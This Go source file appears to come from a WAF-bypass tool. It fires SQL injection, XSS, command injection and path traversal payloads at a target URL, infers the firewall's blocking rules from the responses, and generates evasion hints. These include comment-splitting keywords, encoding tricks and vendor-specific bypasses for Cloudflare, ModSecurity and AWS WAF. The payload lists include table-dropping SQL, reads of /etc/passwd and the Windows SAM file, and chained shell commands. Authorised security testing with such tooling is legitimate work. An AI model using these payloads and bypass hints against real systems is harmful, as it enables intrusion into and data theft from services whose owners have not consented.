package waf

import (
	"context"
	"fmt"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/su1ph3r/bypassburrito/pkg/types"
)

// InferenceHTTPClient interface for HTTP operations in rule inference
type InferenceHTTPClient interface {
	Do(ctx context.Context, req *types.HTTPRequest) (*types.HTTPResponse, error)
}

// RuleInferenceEngine infers WAF rules from blocked/allowed responses
type RuleInferenceEngine struct {
	detector   *Detector
	httpClient InferenceHTTPClient
	minSamples int
}

// InferenceConfig holds configuration for rule inference
type InferenceConfig struct {
	// MinSamples is the minimum number of samples to test
	MinSamples int

	// MaxSamples is the maximum number of samples to test
	MaxSamples int

	// MinConfidence is the minimum confidence to report a rule
	MinConfidence float64

	// IncludeEvasionHints adds bypass suggestions to each rule
	IncludeEvasionHints bool

	// AttackTypes specifies which attack types to test
	AttackTypes []types.AttackType
}

// DefaultInferenceConfig returns default configuration
func DefaultInferenceConfig() InferenceConfig {
	return InferenceConfig{
		MinSamples:          20,
		MaxSamples:          100,
		MinConfidence:       0.6,
		IncludeEvasionHints: true,
		AttackTypes: []types.AttackType{
			types.AttackSQLi,
			types.AttackXSS,
			types.AttackCmdInjection,
			types.AttackPathTraversal,
		},
	}
}

// TestResult holds the result of testing a single payload
type TestResult struct {
	Payload    string
	Blocked    bool
	StatusCode int
	Latency    time.Duration
	Category   string
}

// NewRuleInferenceEngine creates a new rule inference engine
func NewRuleInferenceEngine(detector *Detector, client InferenceHTTPClient) *RuleInferenceEngine {
	return &RuleInferenceEngine{
		detector:   detector,
		httpClient: client,
		minSamples: 20,
	}
}

// InferRules analyzes responses to infer WAF rules
func (e *RuleInferenceEngine) InferRules(
	ctx context.Context,
	target types.TargetConfig,
	config InferenceConfig,
) (*types.RuleInferenceResult, error) {
	start := time.Now()

	result := &types.RuleInferenceResult{
		Target:        target.URL,
		InferredRules: []types.InferredRule{},
	}

	// First detect WAF
	wafResult, err := e.detectWAF(ctx, target)
	if err == nil && wafResult.Detected {
		result.WAFType = wafResult.Type
	} else {
		result.WAFType = types.WAFUnknown
	}

	// Generate test payloads
	testPayloads := e.generateTestPayloads(config)

	// Test each payload
	testResults := e.runTests(ctx, target, testPayloads)

	// Count blocked vs allowed
	var blocked, allowed []TestResult
	for _, r := range testResults {
		if r.Blocked {
			blocked = append(blocked, r)
			result.BlockedCount++
		} else {
			allowed = append(allowed, r)
			result.AllowedCount++
		}
	}

	result.TotalSamples = len(testResults)

	// Infer rules from results
	rules := e.analyzeResults(blocked, allowed, config)
	result.InferredRules = rules

	// Add evasion hints if requested
	if config.IncludeEvasionHints {
		for i := range result.InferredRules {
			result.InferredRules[i].EvasionHints = e.generateEvasionHints(&result.InferredRules[i], result.WAFType)
		}
	}

	result.Duration = time.Since(start).Milliseconds()
	result.Summary = e.generateSummary(result)

	return result, nil
}

// generateTestPayloads creates a diverse set of test payloads
func (e *RuleInferenceEngine) generateTestPayloads(config InferenceConfig) []TestResult {
	var payloads []TestResult

	for _, attackType := range config.AttackTypes {
		attackPayloads := e.getPayloadsForType(attackType)
		for _, p := range attackPayloads {
			payloads = append(payloads, TestResult{
				Payload:  p,
				Category: string(attackType),
			})
		}
	}

	// Limit to MaxSamples
	if len(payloads) > config.MaxSamples {
		payloads = payloads[:config.MaxSamples]
	}

	return payloads
}

// getPayloadsForType returns test payloads for a specific attack type
func (e *RuleInferenceEngine) getPayloadsForType(attackType types.AttackType) []string {
	switch attackType {
	case types.AttackSQLi:
		return []string{
			// Basic SQLi
			"'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
			"' OR 1=1--", "\" OR 1=1--", "1' OR '1'='1",
			// UNION based
			"UNION SELECT", "' UNION SELECT NULL--",
			"1 UNION SELECT 1,2,3--",
			// Error based
			"' AND 1=CONVERT(int,@@version)--",
			"' AND extractvalue(1,concat(0x7e,version()))--",
			// Time based
			"' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
			"'; SELECT SLEEP(5);--",
			// Stacked queries
			"'; DROP TABLE users;--", "'; INSERT INTO users VALUES('x');--",
			// Keywords
			"SELECT", "INSERT", "UPDATE", "DELETE", "DROP",
			"EXEC", "EXECUTE", "xp_cmdshell",
			// Encoded
			"%27", "%22", "%27%20OR%20%271%27=%271",
		}

	case types.AttackXSS:
		return []string{
			// Basic XSS
			"<script>", "</script>", "<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			// Event handlers
			"onerror=", "onload=", "onclick=", "onmouseover=",
			// Protocol handlers
			"javascript:", "vbscript:", "data:text/html",
			// Tags
			"<svg onload=alert(1)>", "<body onload=alert(1)>",
			"<iframe src=javascript:alert(1)>",
			// Encoded
			"&#60;script&#62;", "%3Cscript%3E",
			"\\u003cscript\\u003e",
			// Template injection
			"{{constructor.constructor('return this')()}}",
			"${7*7}",
		}

	case types.AttackCmdInjection:
		return []string{
			// Unix commands
			";id", "|id", "$(id)", "`id`",
			";cat /etc/passwd", "|cat /etc/passwd",
			// Windows commands
			"& dir", "| dir", "&& whoami",
			// Bypass attempts
			";i'd", "$(i'd)", "|wh'oami",
			// Encoded
			"%3Bid", "%7Cid",
			// Newlines
			"\nid", "\r\ndir",
		}

	case types.AttackPathTraversal:
		return []string{
			// Basic traversal
			"../", "..\\", "....//", "....\\\\",
			"../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
			// Encoded
			"%2e%2e%2f", "%2e%2e/", "..%2f",
			"%252e%252e%252f", // Double encoded
			// Null byte
			"../../../etc/passwd%00",
			// Unicode
			"..%c0%af", "..%c1%9c",
		}

	default:
		return []string{}
	}
}

// runTests executes test payloads against the target
func (e *RuleInferenceEngine) runTests(
	ctx context.Context,
	target types.TargetConfig,
	payloads []TestResult,
) []TestResult {
	results := make([]TestResult, 0, len(payloads))

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return results
		default:
		}

		req := e.buildRequest(target, p.Payload)
		start := time.Now()

		resp, err := e.httpClient.Do(ctx, req)
		latency := time.Since(start)

		result := TestResult{
			Payload:  p.Payload,
			Category: p.Category,
			Latency:  latency,
		}

		if err != nil {
			result.Blocked = true // Assume blocked on error
			result.StatusCode = 0
		} else {
			result.StatusCode = resp.StatusCode
			result.Blocked = e.isBlocked(resp)
		}

		results = append(results, result)
	}

	return results
}

// isBlocked determines if a response indicates blocking
func (e *RuleInferenceEngine) isBlocked(resp *types.HTTPResponse) bool {
	// Status code check
	if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429 {
		return true
	}

	// Body pattern check
	blockPatterns := []string{
		"blocked", "forbidden", "access denied",
		"security", "firewall", "waf",
		"attack detected", "malicious",
	}

	bodyLower := strings.ToLower(resp.Body)
	for _, pattern := range blockPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}

// analyzeResults infers rules from test results
func (e *RuleInferenceEngine) analyzeResults(
	blocked, allowed []TestResult,
	config InferenceConfig,
) []types.InferredRule {
	var rules []types.InferredRule

	// Group blocked payloads by category
	byCategory := make(map[string][]TestResult)
	for _, b := range blocked {
		byCategory[b.Category] = append(byCategory[b.Category], b)
	}

	// Identify keyword rules
	keywordRules := e.identifyKeywordRules(blocked, allowed)
	rules = append(rules, keywordRules...)

	// Identify pattern rules
	patternRules := e.identifyPatternRules(blocked, allowed)
	rules = append(rules, patternRules...)

	// Identify encoding rules
	encodingRules := e.identifyEncodingRules(blocked, allowed)
	rules = append(rules, encodingRules...)

	// Filter by minimum confidence
	var filtered []types.InferredRule
	for _, rule := range rules {
		if rule.Confidence >= config.MinConfidence {
			filtered = append(filtered, rule)
		}
	}

	// Sort by confidence
	sort.Slice(filtered, func(i, j int) bool {
		return filtered[i].Confidence > filtered[j].Confidence
	})

	return filtered
}

// identifyKeywordRules finds simple keyword-based rules
func (e *RuleInferenceEngine) identifyKeywordRules(blocked, allowed []TestResult) []types.InferredRule {
	var rules []types.InferredRule

	// Keywords to check
	keywords := map[string]string{
		"SELECT":    "sqli",
		"UNION":     "sqli",
		"INSERT":    "sqli",
		"UPDATE":    "sqli",
		"DELETE":    "sqli",
		"DROP":      "sqli",
		"EXEC":      "sqli",
		"<script":   "xss",
		"onerror":   "xss",
		"onload":    "xss",
		"javascript": "xss",
		";id":       "cmdi",
		"|id":       "cmdi",
		"$(":        "cmdi",
		"../":       "path",
		"..\\\\":    "path",
	}

	for keyword, category := range keywords {
		blockedWith := 0
		allowedWith := 0
		var examples []types.RuleExample

		// Check blocked payloads
		for _, b := range blocked {
			if strings.Contains(strings.ToLower(b.Payload), strings.ToLower(keyword)) {
				blockedWith++
				if len(examples) < 3 {
					examples = append(examples, types.RuleExample{
						Payload: b.Payload,
						Blocked: true,
						Match:   keyword,
					})
				}
			}
		}

		// Check allowed payloads
		for _, a := range allowed {
			if strings.Contains(strings.ToLower(a.Payload), strings.ToLower(keyword)) {
				allowedWith++
				if len(examples) < 5 {
					examples = append(examples, types.RuleExample{
						Payload: a.Payload,
						Blocked: false,
						Match:   keyword,
					})
				}
			}
		}

		// Calculate confidence
		total := blockedWith + allowedWith
		if total > 0 && blockedWith > 0 {
			confidence := float64(blockedWith) / float64(total)

			// Higher confidence if no false negatives
			if allowedWith == 0 && blockedWith >= 2 {
				confidence = 0.95
			}

			if confidence >= 0.5 {
				rules = append(rules, types.InferredRule{
					Pattern:     keyword,
					RuleType:    "keyword",
					Category:    category,
					Confidence:  confidence,
					BlockedBy:   extractPayloads(blocked, keyword),
					AllowedBy:   extractPayloads(allowed, keyword),
					Examples:    examples,
					Description: fmt.Sprintf("Blocks requests containing '%s'", keyword),
				})
			}
		}
	}

	return rules
}

// identifyPatternRules finds regex-based rules
func (e *RuleInferenceEngine) identifyPatternRules(blocked, allowed []TestResult) []types.InferredRule {
	var rules []types.InferredRule

	// Common WAF regex patterns
	patterns := map[string]struct {
		regex    string
		category string
		desc     string
	}{
		"sql_comment": {
			regex:    `--\s*$|/\*.*\*/|#\s*$`,
			category: "sqli",
			desc:     "SQL comment patterns",
		},
		"sql_union": {
			regex:    `(?i)union\s+select`,
			category: "sqli",
			desc:     "UNION SELECT pattern",
		},
		"sql_or_true": {
			regex:    `(?i)'\s*or\s*'?\d+\s*[=<>]`,
			category: "sqli",
			desc:     "SQL OR true condition",
		},
		"xss_event": {
			regex:    `(?i)on\w+\s*=`,
			category: "xss",
			desc:     "JavaScript event handler",
		},
		"xss_tag": {
			regex:    `<\s*(script|img|svg|iframe|body)`,
			category: "xss",
			desc:     "Dangerous HTML tags",
		},
		"cmd_chain": {
			regex:    `[;&|]\s*\w+`,
			category: "cmdi",
			desc:     "Command chaining",
		},
		"path_traversal": {
			regex:    `\.{2,}[/\\]`,
			category: "path",
			desc:     "Path traversal sequences",
		},
	}

	for name, p := range patterns {
		re, err := regexp.Compile(p.regex)
		if err != nil {
			continue
		}

		blockedMatches := 0
		allowedMatches := 0
		var examples []types.RuleExample

		for _, b := range blocked {
			if re.MatchString(b.Payload) {
				blockedMatches++
				if len(examples) < 3 {
					match := re.FindString(b.Payload)
					examples = append(examples, types.RuleExample{
						Payload: b.Payload,
						Blocked: true,
						Match:   match,
					})
				}
			}
		}

		for _, a := range allowed {
			if re.MatchString(a.Payload) {
				allowedMatches++
			}
		}

		total := blockedMatches + allowedMatches
		if total > 0 && blockedMatches > 0 {
			confidence := float64(blockedMatches) / float64(total)

			if allowedMatches == 0 && blockedMatches >= 2 {
				confidence = 0.9
			}

			if confidence >= 0.5 {
				rules = append(rules, types.InferredRule{
					Pattern:     p.regex,
					RuleType:    "regex",
					Category:    p.category,
					Confidence:  confidence,
					Examples:    examples,
					Description: fmt.Sprintf("Regex rule: %s (%s)", name, p.desc),
				})
			}
		}
	}

	return rules
}

// identifyEncodingRules finds encoding-related rules
func (e *RuleInferenceEngine) identifyEncodingRules(blocked, allowed []TestResult) []types.InferredRule {
	var rules []types.InferredRule

	// Check if URL encoding bypasses blocks
	urlEncoded := 0
	urlEncodedBlocked := 0

	for _, b := range blocked {
		if strings.Contains(b.Payload, "%") {
			urlEncoded++
			urlEncodedBlocked++
		}
	}

	for _, a := range allowed {
		if strings.Contains(a.Payload, "%") {
			urlEncoded++
		}
	}

	if urlEncoded > 0 {
		blockRate := float64(urlEncodedBlocked) / float64(urlEncoded)
		if blockRate > 0.8 {
			rules = append(rules, types.InferredRule{
				Pattern:     "URL encoded characters",
				RuleType:    "encoding",
				Category:    "general",
				Confidence:  blockRate,
				Description: "WAF blocks URL-encoded attack patterns",
			})
		} else if blockRate < 0.3 {
			rules = append(rules, types.InferredRule{
				Pattern:     "URL encoding bypass",
				RuleType:    "encoding",
				Category:    "general",
				Confidence:  1 - blockRate,
				Description: "WAF may not properly decode URL-encoded payloads",
				EvasionHints: []string{
					"Try URL encoding attack patterns",
					"Try double URL encoding",
				},
			})
		}
	}

	return rules
}

// generateEvasionHints creates bypass suggestions for a rule
func (e *RuleInferenceEngine) generateEvasionHints(rule *types.InferredRule, wafType types.WAFType) []string {
	var hints []string

	switch rule.RuleType {
	case "keyword":
		hints = append(hints,
			fmt.Sprintf("Try case variations: %s, %s", strings.ToUpper(rule.Pattern), strings.ToLower(rule.Pattern)),
			"Insert SQL comments: SEL/**/ECT",
			"Use URL encoding",
			"Try Unicode variations",
		)

	case "regex":
		hints = append(hints,
			"Break pattern with encoding",
			"Insert null bytes or comments",
			"Use alternative syntax",
		)

	case "encoding":
		hints = append(hints,
			"Try different encoding schemes",
			"Mix encoding types",
			"Use overlong UTF-8 sequences",
		)
	}

	// WAF-specific hints
	switch wafType {
	case types.WAFCloudflare:
		hints = append(hints, "Cloudflare: Try Unicode normalization bypasses")
	case types.WAFModSecurity:
		hints = append(hints, "ModSecurity: Check paranoia level, try comment injection")
	case types.WAFAWSWaf:
		hints = append(hints, "AWS WAF: Try request splitting, header injection")
	}

	return hints
}

// generateSummary creates a human-readable summary
func (e *RuleInferenceEngine) generateSummary(result *types.RuleInferenceResult) string {
	var sb strings.Builder

	sb.WriteString(fmt.Sprintf("Tested %d payloads: %d blocked, %d allowed\n",
		result.TotalSamples, result.BlockedCount, result.AllowedCount))

	if result.WAFType != types.WAFUnknown {
		sb.WriteString(fmt.Sprintf("Detected WAF: %s\n", result.WAFType))
	}

	sb.WriteString(fmt.Sprintf("Inferred %d rules:\n", len(result.InferredRules)))

	// Summarize by category
	byCategory := make(map[string]int)
	for _, rule := range result.InferredRules {
		byCategory[rule.Category]++
	}

	for cat, count := range byCategory {
		sb.WriteString(fmt.Sprintf("  - %s: %d rules\n", cat, count))
	}

	return sb.String()
}

// detectWAF performs WAF detection
func (e *RuleInferenceEngine) detectWAF(ctx context.Context, target types.TargetConfig) (*types.WAFDetectionResult, error) {
	req := &types.HTTPRequest{
		Method:    target.Method,
		URL:       target.URL,
		Headers:   target.Headers,
		Cookies:   target.Cookies,
		Timestamp: time.Now(),
	}

	resp, err := e.httpClient.Do(ctx, req)
	if err != nil {
		return nil, err
	}

	return e.detector.Detect(resp), nil
}

// buildRequest creates an HTTP request with the payload
func (e *RuleInferenceEngine) buildRequest(target types.TargetConfig, payload string) *types.HTTPRequest {
	req := &types.HTTPRequest{
		Method:      target.Method,
		URL:         target.URL,
		Headers:     make(map[string]string),
		Cookies:     target.Cookies,
		ContentType: target.ContentType,
		Timestamp:   time.Now(),
	}

	for k, v := range target.Headers {
		req.Headers[k] = v
	}

	if target.AuthHeader != "" {
		req.Headers["Authorization"] = target.AuthHeader
	}

	// Insert payload
	switch target.Position {
	case types.PositionQuery:
		if req.Method == "GET" || req.Method == "" {
			separator := "?"
			if strings.Contains(req.URL, "?") {
				separator = "&"
			}
			req.URL = req.URL + separator + target.Parameter + "=" + payload
		}
	case types.PositionBody:
		req.Body = fmt.Sprintf("%s=%s", target.Parameter, payload)
	case types.PositionHeader:
		req.Headers[target.Parameter] = payload
	}

	return req
}

// Helper functions

func extractPayloads(results []TestResult, keyword string) []string {
	var payloads []string
	for _, r := range results {
		if strings.Contains(strings.ToLower(r.Payload), strings.ToLower(keyword)) {
			payloads = append(payloads, r.Payload)
		}
	}
	return payloads
}
